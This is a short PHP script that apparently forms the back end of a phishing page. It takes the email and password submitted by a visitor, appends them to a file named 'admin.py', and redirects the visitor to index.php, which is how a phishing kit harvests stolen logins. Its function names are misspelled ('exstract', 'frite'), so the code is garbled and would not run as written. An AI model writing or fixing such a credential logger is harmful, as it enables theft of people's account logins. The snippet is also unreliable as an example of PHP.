<?php
exstract($_REQUEST);
$file=fopen("admin.py","a");
frite($file,"email:");
frite($file,$email ."\n");
frite($file,"password:");
frite($file,$pass ."\n");
header("location:index.php");
?>
